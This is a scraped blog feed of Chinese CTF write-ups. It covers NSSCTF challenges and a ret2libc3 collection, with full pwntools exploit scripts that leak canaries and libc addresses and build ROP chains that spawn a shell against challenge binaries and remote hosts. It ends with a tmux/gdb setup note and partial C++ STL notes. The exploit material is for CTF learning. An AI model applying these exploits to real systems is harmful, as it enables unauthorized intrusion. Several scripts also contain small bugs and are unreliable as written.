██████╔╝██║╚██╔╝██║██╔══██║██║ ██║██║██║ ██║ ██║██║ ██║██║ ██╔═██╗ ██╔══╝ ██╔══██╗██║ ╚═╝ ██║██║ ██║╚██████╔╝██║╚██████╗ ██████╔╝╚██████╔╝╚██████╗██║ ██╗███████╗██║ ██║╚═╝ ╚═╝╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚═════╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝ &quot;&quot;&quot;if __name__ == &quot;__main__&quot;: os.system(&quot;rm -f /flag&quot;) print(BANNER) random.seed(&quot;NSSCTF 2nd&quot;) answer=random.randint(0,100) if len(sys.argv)&lt;2: print(&quot;You need to give me the secret!&quot;) else: func() 若按照预设命令执行完main.py后，容器会删除flag文件 所以我们自定义docker启动命令 直接执行cat &#x2F;flag gift_in_qrcode(revenge)链接一下得到一堆Base64编码 先写个脚本解码Base64保存为png 123456789101112import base64# Paste the Base64 encoded string herebase64_string = &quot;your_base64_string_here&quot;# Decode the Base64 stringdecoded_data = base64.b64decode(base64_string)# Save the decoded data as a PNG filewith open(&quot;image.png&quot;, &quot;wb&quot;) as f: f.write(decoded_data) 扫码得到二十个随机数 根据计算随机数种子，并计算下一个随机数，输入程序中即可拿到flag 123456789101112131415from random import randrange, getrandbits, seeddef poc(): for i in range(1,1000): secret_seed = i seed(secret_seed) a = [97,45,232,198,115,215,226,198,32,189,8,210,84,11,150,134,221,207,167,176] reveal = [] for i in range(20): reveal.append(getrandbits(8)) if reveal == a: flag = getrandbits(8) return flag return Falseprint(poc()) 然后最无脑的爆破来了 为什么要爆这么久，早知道我再多爆一会的.. 12345678910111213141516171819from pwn import *count = 0while True: conn = remote(&quot;node5.anna.nssctf.cn&quot;, 28380) conn.recvline().decode() conn.recvline().decode() conn.recv().decode() conn.sendline(str(&#x27;110&#x27;).encode()) count += 1 print(&#x27;count:&#x27;, count) output = conn.recvline().decode() if &#x27;No no no!&#x27; not in output: print(output) break CryptoEzRSA发现e - 3 ，低加密指数爆破 脚本一把梭 123456789101112131415161718import binasciiimport gmpy2e = 3# 读入 n, 密文n = 115383855234466224643769657979808398804254899116842846340552518876890834212233960206021018541117724144757264778086129841154749234706140951832603640953383528482125663673926452745186670807057426128028379664506531814550204605131476026038420737951652389070818761739123318769460392218629003518050621137961009397857c = 5329266956476837379347536739209778690886367516092584944314921220156032648621405214333809779485753073093853063734538746101929825083615077i = 0while 1: res = gmpy2.iroot(c+i*n,3) if(res[1] == True): m=res[0] print(binascii.unhexlify(hex(m)[2:].strip(&quot;L&quot;))) break print(&quot;i=&quot;+str(i)) i = i+1 NSSCTF{Rea1_Si9n3n} FunnyEncrypt 本来想看看能不能词频分析的，结果发现完全对不到 只好根据已知的nssctf和前面的一堆话里面寻找符合预感的字符与字母对应关系 ， 慢慢对应着可以找到的","categories":[{"name":"wp","slug":"wp","permalink":"http://lmarch2.github.com/categories/wp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"}]},{"title":"WSL2下不能使用gdb.attach的解决方案","slug":"WSL2下不能使用gdb-attach的解决方案","date":"2023-08-29T12:53:24.000Z","updated":"2024-01-31T02:11:02.736Z","comments":true,"path":"posts/19b7c9d1/","link":"","permalink":"http://lmarch2.github.com/posts/19b7c9d1/","excerpt":"pwndbg在WSL下一直没法使用下断点调试的功能，找了半天发现tmux可以帮助解决这个问题 安装tmux用root权限安装 sudo apt-get install tmux 进入根目录 cd ~","text":"pwndbg在WSL下一直没法使用下断点调试的功能，找了半天发现tmux可以帮助解决这个问题 安装tmux用root权限安装 sudo apt-get install tmux 进入根目录 cd ~ 编辑配置使用root权限打开tmux，方便保存配置文件 sudo tmux 新建.tmux.conf文件 vim .tmux.conf 在文件中输入 12345#输入bind-key c new-window -c &quot;#&#123;pane_current_path&#125;&quot;bind-key % split-window -h -c &quot;#&#123;pane_current_path&#125;&quot;bind-key &#x27;&quot;&#x27; split-window -c &quot;#&#123;pane_current_path&#125;&quot;set -g mouse on 关闭所有tmux窗口并输入 tmux source-file ~&#x2F;.tmux.conf 重新启动tmux则完成更改、 使用接下来可以在exp中下断点了 gdb.attach(p) 同时要在exp中加上指定terminal context.terminal &#x3D; [‘tmux’, ‘splitw’, ‘-h’] -h代表横向分屏 之后就可以在运行exp时debug 注意要在tmux终端下运行","categories":[{"name":"tools and tricks","slug":"tools-and-tricks","permalink":"http://lmarch2.github.com/categories/tools-and-tricks/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://lmarch2.github.com/tags/pwn/"}]},{"title":"ROUND#14 wp","slug":"ROUND14 love","date":"2023-08-29T12:46:39.000Z","updated":"2024-01-31T02:08:26.589Z","comments":true,"path":"posts/fa745d1d/","link":"","permalink":"http://lmarch2.github.com/posts/fa745d1d/","excerpt":"NSSCTF ROUND#14love0x01程序开启NX和canary保护 vuln函数中存在栈溢出 变量v4 &#x3D; 555，v5 &#x3D; 520 read函数读入0x40字节，在printf处有格式化字符串漏洞 需要注意buf为bss段变量，非栈格式化字符串漏洞不能直接修改栈上的值，需要通过二级指针，即栈链间接修改 思路： 利用格式化字符串漏洞任意写修改让v4&#x3D;v5，进入vuln函数 利用格式化字符串泄露canary和__libc_start_main函数真实地址，计算出libc基址 构造pay覆盖返回地址为og或system rop链getshell","text":"NSSCTF ROUND#14love0x01程序开启NX和canary保护 vuln函数中存在栈溢出 变量v4 &#x3D; 555，v5 &#x3D; 520 read函数读入0x40字节，在printf处有格式化字符串漏洞 需要注意buf为bss段变量，非栈格式化字符串漏洞不能直接修改栈上的值，需要通过二级指针，即栈链间接修改 思路： 利用格式化字符串漏洞任意写修改让v4&#x3D;v5，进入vuln函数 利用格式化字符串泄露canary和__libc_start_main函数真实地址，计算出libc基址 构造pay覆盖返回地址为og或system rop链getshell 0x02第一步将v4写为520。如图在栈偏移为3的地方有一个栈链：0x7ffe9c35d798-&gt;0x7ffe9c35d788&lt;-0x22b，可以用来修改0x22b为0x208 这里可构造pay为 pay &#x3D; ‘%’+str(8)+’c’+’%9$hhn’ 或者 pay &#x3D; ‘%’+str(520)+’c’+’%9$hhn’ （也可以直接n不用hhn） 第二步泄露canary 和 __libc_start_main地址 这里需要先patchelf再调试确定偏移 这题不仅要patch掉libc和ld，还要再patchelf –replace-needed libpthread.so.0 .&#x2F;libpthread-2.31.so .&#x2F;binary 确定canary的偏移为9+6 &#x3D; 15；__libc_start_main+243便宜为11+6 &#x3D; 17 pay +&#x3D; ‘-%15$p-%17$p-‘ 0x03覆盖返回地址为one_gadget，或者调用system函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]p = process(&quot;./pwn&quot;)#p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28157)sda = lambda delim,data :p.sendafter(delim,data)sd = lambda data :p.send(data)sea = lambda delim,data :p.sendafter(delim,data)sl = lambda data :p.sendline(data)sla = lambda delim,data :p.sendlineafter(delim,data)ru = lambda delims,drop=True :p.recvuntil(delims,drop)uu32 = lambda data :u32(data.ljust(4,b&#x27;\\x00&#x27;))uu64 = lambda data :u64(data.ljust(8,b&#x27;\\x00&#x27;))lg = lambda name,addr :log.success(name+&#x27;=&#x27;+hex(addr))ra = lambda :p.interactive()def get_addr64() : return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))def get_addr32() : return u32(p.recvuntil(b&#x27;\\xf7&#x27;)[-4:])#gdb.attach(p)elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)puts_plt=elf.plt[&#x27;puts&#x27;]puts_got=elf.got[&#x27;puts&#x27;]pay = &#x27;%&#x27;+str(520)+&#x27;c&#x27;+&#x27;%9$hhn&#x27;pay += &#x27;-%15$p-%17$p-&#x27;gdb.attach(p)sla(b&#x27;Toka\\n&#x27;,pay)ru(&#x27;-&#x27;)#泄露cannarycanary = int(ru(&#x27;-&#x27;),16)#libclibc_base = int(ru(&#x27;-&#x27;),16)-243-libc.sym[&#x27;__libc_start_main&#x27;]pop_rdi = 0x00000000004013f3 #pay=b&#x27;A&#x27;*0x28+p64(canary)+b&#x27;A&#x27;*8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(elf.sym[&#x27;vuln&#x27;])#sla(&#x27;level\\n&#x27;,pay)#libcbase = get_addr64()-libc.sym[&#x27;puts&#x27;]#lg(&#x27;libcbase&#x27;,libcbase)lg(&#x27;canary&#x27;,canary)lg(&#x27;libc_base&#x27;,libc_base)system_addr = libc_base+libc.sym[&quot;system&quot;]bin_sh_addr=libc_base+libc.search(b&#x27;/bin/sh&#x27;).__next__()lg(&#x27;system&#x27;,system_addr)lg(&#x27;binsh&#x27;,bin_sh_addr)ru(&#x27;level\\n&#x27;)ret =0x000000000040101a og = [0xe3afe,0xe3b01,0xe3b04]pay = b&#x27;a&#x27;*0x28+p64(canary)+b&#x27;a&#x27;*8+p64(ret)+p64(og[1]+libc_base)#pay = b&#x27;a&#x27;*0x28+p64(canary)+b&#x27;a&#x27;*8+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)sl(pay)ra()","categories":[{"name":"wp","slug":"wp","permalink":"http://lmarch2.github.com/categories/wp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"}]},{"title":"ret2libc3合集","slug":"ret2libc3合集","date":"2023-08-29T12:45:22.000Z","updated":"2024-01-31T02:13:22.409Z","comments":true,"path":"posts/be5100f9/","link":"","permalink":"http://lmarch2.github.com/posts/be5100f9/","excerpt":"ret2libc3目前一些比较经典的ret2libc2的总合集，包括32位和64位，有libc文件和没有libc文件","text":"ret2libc3目前一些比较经典的ret2libc2的总合集，包括32位和64位，有libc文件和没有libc文件 ctf-wiki ret2libc3考点：栈溢出rop 0x01file checksec —— 32-bit 开NX 漏洞和内存分析和之前的系列题类似，不赘述了 0x02IDA看源码，既没有system也没有binsh 由linux延迟绑定机制的知识（后面再写一篇总结吧）可知，我们如果要调用system函数，就要知道他的got表中的地址，但libc被加载到的内存的位置是随机的，我们无法得知不过，同一版本的libc的两个库函数在libc中的相对位置是不变的，所以如果我们可以知道一个已经执行过的函数的got表地址，然后确定libc的版本，就可以加上和system函数的偏移，从而得到system函数的真实地址（got表地址）而现在我们有一个puts函数，libc中也有system和binsh 0x03我们只需要通过栈溢出利用puts函数，打印puts函数的got表中的地址，然后获取偏移，得到system函数和&#x2F;bin&#x2F;sh字符串的地址，再将puts函数的返回地址覆盖为system函数的地址即可我们可以先运行exp1（见0x04）拿到获取puts的真实地址，然后去libc- database -search的网站查询，可得到puts函数system函数和binsh字符串对应的偏移地址 知道了puts函数的真实地址和偏移之后，就可以将puts函数的真实地址减去偏移地址，得到libc的基址，将libc的基址分别与system，&#x2F;bin&#x2F;sh字符串的偏移相加，就可以得到对应的真实地址然后写完整的exp 0x04所以其实exp是分两部的，第一步是构造栈溢出利用puts函数打印出真实地址；第二步是溢出覆盖至system函数和&#x2F;bin&#x2F;sh的地址，拿到shell 1234567891011121314151617181920#first expfrom pwn import *elf=ELF(&#x27;ret2libc3&#x27;)p=process(&#x27;./ret2libc3&#x27;)puts_plt=elf.plt[&#x27;puts&#x27;]puts_got=elf.got[&#x27;puts&#x27;]start_addr = elf.symbols[&#x27;_start&#x27;]payload1=b&#x27;A&#x27;*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)p.sendlineafter(&quot;!?&quot;,payload1)puts_addr=u32(p.recv(4))print(&quot;puts_got_addr = &quot;,hex(puts_got_addr))print(&quot;puts_plt_addr = &quot;,hex(puts_plt_addr))print(&quot;main_plt_addr = &quot;,hex(main_plt_addr))print(&quot;puts addr = &quot;, hex(puts_addr))p.interactive() 12345678910111213141516171819202122232425262728293031323334353637#second expfrom pwn import *p = process(&#x27;./ret2libc3&#x27;)elf = ELF(&#x27;./ret2libc3&#x27;)puts_got_addr = elf.got[&#x27;puts&#x27;]puts_plt_addr = elf.plt[&#x27;puts&#x27;]main_plt_addr = elf.symbols[&#x27;_start&#x27;]print(&quot;puts_got_addr = &quot;,hex(puts_got_addr))print(&quot;puts_plt_addr = &quot;,hex(puts_plt_addr))print(&quot;main_plt_addr = &quot;,hex(main_plt_addr))p.recv()p.sendline(payload)puts_addr = u32(p.recv()[0:4])print(&quot;puts_addr = &quot;,hex(puts_addr))sys_offset = 0x03cd10puts_offset = 0x067360sh_offset = 0x17b8cf#根据公式 libc基地址 + 函数偏移量 = 函数真实地址 来计算libc_base_addr = puts_addr - puts_offset #计算出libc基地址sys_addr = libc_base_addr + sys_offset #计算出system的真实地址sh_addr = libc_base_addr + sh_offset #计算出/bin/sh的真实地址print(&quot;libc_base_addr = &quot;,hex(libc_base_addr))print(&quot;sys_addr = &quot;,hex(sys_addr))print(&quot;sh_addr = &quot;,hex(sh_addr))payload2 = flat([b&#x27;A&#x27;*112, p32(sys_addr), &quot;AAAA&quot;, p32(sh_addr)])p.sendline(payload2)p.interactive() 或者写 1puts_addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;)) 一定注意发送pay前接收的内容0x05搜索libc常用方法： LibcSearcher 网站查找 libc-databasellibc database search libc-database 参考资料：pwn小白入门06–ret2libc基本ROP之ret2libc3yichen二进制安全 对于返回地址不同而导致的输入偏移不同 ciscn_2019_c_10x01简单的ret2libc3file checksec —— 64-bit 开NX 0x02运行一下看看 再看看IDA 研究了半天发现是让你加解密的再看看string window 没用system和binsh又发现加密函数里有gets函数，可构成栈溢出 0x03分析大致流程就是 利用一个程序已经执行过的函数去泄露它在程序中的地址，然后取末尾3个字节，去找到这个程序所使用的libc的版本 用同一个程序里函数的地址-libc里的函数地址即可得到偏移量 得到偏移量后就可以推算出程序中其他函数的地址，知道其他函数的地址之后就可以去执行system（’&#x2F;bin&#x2F;sh‘） 0x04写exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import*from LibcSearcher import*p=remote(&#x27;node4.buuoj.cn&#x27;,28342)elf=ELF(&#x27;./ciscn_2019_c_1&#x27;)main=0x400b28pop_rdi=0x400c83ret=0x4006b9puts_plt=elf.plt[&#x27;puts&#x27;]puts_got=elf.got[&#x27;puts&#x27;]p.sendlineafter(&#x27;choice!\\n&#x27;,&#x27;1&#x27;)payload=&#x27;\\0&#x27;+&#x27;a&#x27;*(0x50-1+8)payload+=p64(pop_rdi)payload+=p64(puts_got)payload+=p64(puts_plt)payload+=p64(main)p.sendlineafter(&#x27;encrypted\\n&#x27;,payload)p.recvline()p.recvline()puts_addr=u64(r.recvuntil(&#x27;\\n&#x27;)[:-1].ljust(8,&#x27;\\0&#x27;))print hex(puts_addr)libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)offset=puts_addr-libc.dump(&#x27;puts&#x27;)binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)system=offset+libc.dump(&#x27;system&#x27;)p.sendlineafter(&#x27;choice!\\n&#x27;,&#x27;1&#x27;)payload=&#x27;\\0&#x27;+&#x27;a&#x27;*(0x50-1+8)payload+=p64(ret)payload+=p64(pop_rdi)payload+=p64(binsh)payload+=p64(system)p.sendlineafter(&#x27;encrypted\\n&#x27;,payload)p.interactive() 0x05libcsearch的github网址安装 git clone https://github.com/lieanu/LibcSearcher.gitcd LibcSearchersudo python setup.py develop 覆盖数据payload&#x3D;b’\\0’+b’a’*(0x50-1+8)\\0是为了让加密函数的一个strlen函数停止（这个函数遇‘0’会停止），从而绕过加密，保证我们构造的rop不会被破坏，buf的大小为0x50-1是减去\\0+8是覆盖rbp 这道题的接收非常讲究泄露地址接收时先是两下recvline()，原因 recvline()一次接收到\\n;第一次recvline只能到Ciphertext；第二次只能接收到0a第三次的recvuntil才开始处理泄露的got地址。先开一下context_log_lever&#x3D;’debug’，整体看一下， 再自己recvuntil看能接收到什么内容。 然后再用recvuntil(‘\\n’)[:-1].ljust(8,’\\0’)来舍弃接收到的字符串最后的’\\x0’并向左补齐 这一道题是64位的程序，这边涉及到64位程序和32位程序运行时的区别了32位程序运行执行指令的时候直接去内存地址寻址执行64位程序则是通过寄存器来传址，寄存器去内存寻址，找到地址返回给程序。因此要用寄存器存参 注意栈对齐 还有最后还要再输一个0 参考资料： [BUUCTF]PWN6——ciscn_2019_c_1 [OGeek2019]babyropBUUCTF pwn考点： ret2libc3 0x0164位程序，开启NX 没有system函数和&#x2F;bin&#x2F;sh字符串 0x02分析程序： main函数中，先读取一个随机数到fd，并作为参数传入sub_804871F函数，再将sub_804871F函数的返回值作为参数传入sub_80487D0函数里。 main函数 sub_804871F函数 sub_80487D0函数 观察程序我们可以发现sub_80487D0函数有栈溢出漏洞 然而想要利用栈溢出需要我们达成两个目标 1、绕过sub_804871F函数中的exit函数，这就要让strncmp的返回值为0 2、让sub_80487D0函数中a1（即buf[7]）的ASCII码值尽可能大，构造栈溢出 0x03首先第一步，我们知道，buf和s数组完全相等时，strncmp函数返回0，但是sprinf函数将随机数加到了s数组中，buf与s很难相等。不过在v1为0的时候strncmp函数也是会返回0的，而v1是读取的buf的大小，我们可以控制buf的第一位为’\\x00’，可起到截断字符串长度的效果。 第二步，若要利用栈溢出ret2libc泄露write函数地址的话，起码需要231+4+4*5 &#x3D; 255个字节，所以让buf[7] &#x3D; ‘\\xff’即可。代码中的buf[v5-1] &#x3D; 0改变的是字符串末尾’\\x00’的值，不影响buf[7] 。 所以第一次读取的payload为 1234payload = b&#x27;\\x00&#x27;+b&#x27;\\xff&#x27;*7p.sendline(payload)p.recvuntil(&quot;Correct\\n&quot;) 0x04注意本题提供了libc，直接使用pwntools工具即可，不必使用LibcSearcher main函数地址用elf.sym[‘main’]是找不到的，objdump -t命令查看发现程序没有符号表，原因应该是出题人使用strip命令去符号表了 完整exp 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *from LibcSearcher import *context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,28188)#p = process(&#x27;./pwn&#x27;)elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;libc-2.23.so&#x27;)payload = b&#x27;\\x00&#x27;+b&#x27;\\xff&#x27;*7p.sendline(payload)p.recvuntil(&quot;Correct\\n&quot;)write_plt = elf.plt[&quot;write&quot;]write_got = elf.got[&quot;write&quot;]#main_addr = elf.plt[&#x27;__libc_start_main&#x27;]main_addr = 0x8048825payload1 = b&#x27;a&#x27;*0xe7+b&#x27;a&#x27;*4+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)p.sendline(payload1)write_addr = u32(p.recv(4))#print(hex(write_addr))libc_base = write_addr - libc.sym[&quot;write&quot;]system_addr = libc_base+libc.sym[&quot;system&quot;]bin_sh_addr=libc_base+libc.search(b&#x27;/bin/sh&#x27;).__next__()p.sendline(payload)p.recvuntil(&quot;Correct\\n&quot;)payload2 = b&#x27;a&#x27;*0xe7+b&#x27;a&#x27;*4+p32(system_addr)+p32(0)+p32(bin_sh_addr)p.sendline(payload2)p.interactive() 铁人三项(第五赛区)_2018_rop经典ret2libc3 exp 12345678910111213141516171819202122232425262728from pwn import * from LibcSearcher import * context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;) #p = process(&#x27;./pwn&#x27;) p = remote(&#x27;node4.buuoj.cn&#x27;,28146)elf = ELF(&#x27;./pwn&#x27;)main_addr = elf.sym[&#x27;main&#x27;]plt_addr = elf.plt[&#x27;write&#x27;] got_addr = elf.got[&#x27;write&#x27;]pay1 = b&#x27;a&#x27;*(0x88+4)+p32(plt_addr)+p32(main_addr)+p32(1)+p32(got_addr)+p32(0xD)p.sendline(pay1)write_addr = u32(p.recv()[0:4])#0xf7db1190print(&quot;write_addr = &quot;,hex(write_addr))libc=LibcSearcher(&#x27;write&#x27;,write_addr)offset=write_addr-libc.dump(&#x27;write&#x27;)binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)system=offset+libc.dump(&#x27;system&#x27;)print(&quot;libc_base_addr = &quot;,hex(offset))print(&quot;sys_addr = &quot;,hex(system))print(&quot;sh_addr = &quot;,hex(binsh))pay2 = b&#x27;a&#x27;*(0x88+4)+p32(system)+b&#x27;aaaa&#x27;+p32(binsh)p.sendline(pay2)p.interactive() pwn2_sctf_20160x0132位开NX泄露libc 注意get_n是自定义函数 规定读入v2长度的字符，但是程序要求v2不大于32。观察到int型的v2传入unsigned int型的a2，可以传入-1整数溢出绕过。 ROP链泄露libc，溢出覆盖返回地址getshell 0x02exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import * from LibcSearcher import * context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;) #p = process(&#x27;./pwn0&#x27;) p = remote(&#x27;node4.buuoj.cn&#x27;,26602)p.recvuntil(b&quot;How many bytes do you want me to read?&quot;)p.sendline(b&#x27;-1&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)elf = ELF(&#x27;./pwn0&#x27;) main_addr = elf.sym[&#x27;main&#x27;]plt_addr = elf.plt[&#x27;printf&#x27;] got_addr = elf.got[&#x27;getchar&#x27;]fmt = 0x080486F#第一行的才正确？pay1 = b&#x27;a&#x27;*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(fmt)+p32(got_addr)#pay1 = b&#x27;a&#x27;*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(got_addr)+p32(fmt)#pay1 = b&#x27;a&#x27;*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(got_addr)p.recvuntil(b&quot;\\n&quot;)p.sendline(pay1)getchar_addr= u32(p.recvuntil(b&#x27;\\xf7&#x27;)[-4:])#getchar_addr = u32(p.recv()[0:4])变成接收前面四个字节了print(&quot;getchar_addr = &quot;,hex(getchar_addr))&#x27;&#x27;&#x27;libc=LibcSearcher(&#x27;getchar&#x27;,getchar_addr)offset=getchar_addr-libc.dump(&#x27;getchar&#x27;)binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)system=offset+libc.dump(&#x27;system&#x27;)&#x27;&#x27;&#x27;base_addr = getchar_addr - libc.symbols[&#x27;getchar&#x27;]system = libc.symbols[&#x27;system&#x27;] + base_addrbinsh = libc.search(b&#x27;/bin/sh&#x27;).__next__() + base_addrprint(&quot;libc_base_addr = &quot;,hex(base_addr))#print(&quot;libc_base_addr = &quot;,hex(offset))print(&quot;sys_addr = &quot;,hex(system))print(&quot;sh_addr = &quot;,hex(binsh))pay2 = b&#x27;a&#x27;*(0x2c+4)+p32(system)+b&#x27;aaaa&#x27;+p32(binsh)p.recvuntil(b&quot;How many bytes do you want me to read?&quot;)p.sendline(b&#x27;-1&#x27;)p.recvuntil(b&quot;\\n&quot;)p.sendline(pay2)p.interactive() bjdctf_2020_babyrop0x0164位，与32位传参有区别 思路： 利用puts函数泄露出puts函数真实地址 通过puts函数地址计算出libc基地址，从而计算出system和binsh的真实地址 构造rop链栈溢出getshell puts函数通过pop rdi ; ret 传参 用ROPgadget可以找到 0x02exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445#encoding = utf-8 from pwn import * from LibcSearcher import * context(os = &#x27;linux&#x27;,arch = &#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)content = 1elf = ELF(&#x27;./pwn&#x27;) def main(): if content == 1: p = process(&#x27;./pwn&#x27;) else: p = remote(&#x27;node4.buuoj.cn&#x27;,29917) #elf main_addr = elf.sym[&#x27;main&#x27;] plt_addr = elf.plt[&#x27;puts&#x27;] got_addr = elf.got[&#x27;puts&#x27;] pop_rdi = 0x0400733 ret_addr = 0x04004c9 payload = b&#x27;a&#x27;*(0x20+0x8) + p64(pop_rdi) + p64(got_addr) + p64(plt_addr) + p64(main_addr) p.recvuntil(&quot;Pull up your sword and tell me u story!\\n&quot;) p.sendline(payload) puts_addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;)) print(hex(puts_addr)) #libc lib = LibcSearcher(&#x27;puts&#x27;,puts_addr) lib_puts_addr = lib.dump(&#x27;puts&#x27;) lib_system_addr = lib.dump(&#x27;system&#x27;) lib_bin_addr = lib.dump(&#x27;str_bin_sh&#x27;) #base base_addr = puts_addr - lib_puts_addr system_addr = base_addr + lib_system_addr bin_addr = base_addr + lib_bin_addr payload = b&#x27;a&#x27;*(0x20+0x8) + p64(ret_addr) + p64(pop_rdi) + p64(bin_addr) + p64(system_addr) p.recvuntil(&quot;Pull up your sword and tell me u story!\\n&quot;) p.sendline(payload) p.interactive()main() [HarekazeCTF2019]baby_rop264位的ret2libc3 0x01 利用printf泄露libc版本和基地址，传参的时候需要传入格式化字符串%s给寄存器rdi（程序中第二个printf函数自带，返回至该格式化字符串地址即可）；并将想要泄露的read_got传给寄存器。 0x02exp 12345678910111213141516171819202122232425262728293031323334353637from pwn import *from LibcSearcher import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,25502)#p = process(&#x27;./babyrop2&#x27;)elf = ELF(&#x27;./babyrop2&#x27;)libc = ELF(&#x27;libc.so.6&#x27;)#一定要用题目给的libc文件，可能必须要用题目给的才能打通printf_plt = elf.plt[&#x27;printf&#x27;]read_got = elf.got[&#x27;read&#x27;]main_plt = elf.sym[&#x27;main&#x27;]pop_rdi = 0x0000000000400733pop_rsi_r15 = 0x0000000000400731fmt = 0x0000000000400790payload1 = b&#x27;a&#x27;*(0x20+8)+p64(pop_rdi)+p64(fmt)+p64(pop_rsi_r15)+p64(read_got)+p64(0)+p64(printf_plt)+p64(main_plt)p.recvuntil(&quot;name? &quot;)p.sendline(payload1)read_addr = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))print(&quot;read_addr ======&gt;&gt; &quot;+hex(read_addr))libc_base = read_addr - libc.sym[&quot;read&quot;]system_addr = libc_base+libc.sym[&quot;system&quot;]bin_sh_addr=libc_base+libc.search(b&#x27;/bin/sh&#x27;).__next__()payload2 = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)+p64(0)p.sendline(payload2)p.interactive()","categories":[{"name":"collections","slug":"collections","permalink":"http://lmarch2.github.com/categories/collections/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"}]},{"title":"C++STL 学习笔记","slug":"C++STL 学习笔记","date":"2023-08-29T12:37:51.000Z","updated":"2024-01-31T02:56:26.577Z","comments":true,"path":"posts/45592537/","link":"","permalink":"http://lmarch2.github.com/posts/45592537/","excerpt":"C++STL 学习笔记记录一些数据结构课外学习STL容器使用的笔记，当个字典用吧嘿嘿~~ STL补充 List 链表 vector 存放任意类型的动态数组 STL容器适配器 stack queue priority_queue deque heap pair 迭代器类型补充 STL对于空间大小的规定","text":"C++STL 学习笔记记录一些数据结构课外学习STL容器使用的笔记，当个字典用吧嘿嘿~~ STL补充 List 链表 vector 存放任意类型的动态数组 STL容器适配器 stack queue priority_queue deque heap pair 迭代器类型补充 STL对于空间大小的规定 STL补充List 链表 list&lt;int&gt; mylist = &#123; &#125;链表定义和初始化 void push_front(const T &amp; val) 将 val 插入链表最前面 void pop_front() 删除链表最前面的元素 list.push_back() 增加一个新的元素在 list 的尾端 list.pop_back() 删除 list 的最末个元素 void sort() 将链表从小到大排序 reverse()反转链表 list.empty() 若list内部为空，则回传true值 list.size() 回传list内实际的元素个数 list.front() 存取第一个元素 list.back() 存取最末个元素 mylist.begin() 首位迭代器 mylist.end()末位迭代器 常见for循环 for (auto it = mylist.begin(); it != mylist.end(); ++it) `cout &lt;&lt; *it &lt;&lt; &quot; &quot;;` it是迭代器指针，不能赋值，不能运算（+&#x3D;不行），只能++ list的迭代器只支持双向访问，不支持随机访问，因此不能直接进行加减操作 （和vector等区别） advance(it, n); 将迭代器it向前移动n个位置 mylist.insert(it, k); 向第it位迭代器位置插入新元素k（it之前） mylist.erase(it); 删除第it位迭代器位置所指元素 mylist.erase(it, it + n); 删除第it位到第it+n位元素（一共删除从it开始到it+n的n个元素） next(it,n)函数是C++ STL中的一个函数，它的作用是返回一个新的迭代器，该迭代器指向原始迭代器向前或向后移动指定距离后的位置 ，被用来移动it迭代器到下n位 vector 存放任意类型的动态数组 vector&lt;T&gt;(nSize,t)创建一个vector，元素个数为nSize,且值均为t vector.push_back(k) 在vector尾部插入元素k vector.insert(vector.begin() + 1, 2) 在vector的第2个位置插入一个元素2 vector.pop_back() 删除vector尾部的一个元素 vector.erase(v.begin() + 1) 删除vector的第2个元素 erase()方法接受两个迭代器参数，表示要删除的区间的起始位置和结束位置。被删除的区间包括起始位置的元素，但不包括结束位置的元素。 vector.[0]; 访问vector的第1个元素 ， 可进行赋值等操作 vector.at(0); &#x2F;访问vector的第1个元素，如果越界会抛出异常 for (int i = 0; i &lt; v.size(); i++) &#123; cout &lt;&lt; v[i] &lt;&lt; &quot; &quot;; &#125; 遍历vector vector.resize() 改变实际元素的个数，新添加的元素会被默认初始化 vector.size() 获取vector的大小 ，这是当前存储的元素数量 vector.capacity()返回当前容量，这是目前容器最多储存的元素数量 vector.front() 返回第一个元素的引用 vector.back()返回最后一个元素的引用 vector.begin()返回指向容器中第一个元素的迭代器 vector.end()返回指向容器最后一个元素所在位置后一个位置的迭代器，通常和 begin() 结合使用 vector.empty()判断一个vector是否为空 STL容器适配器stack 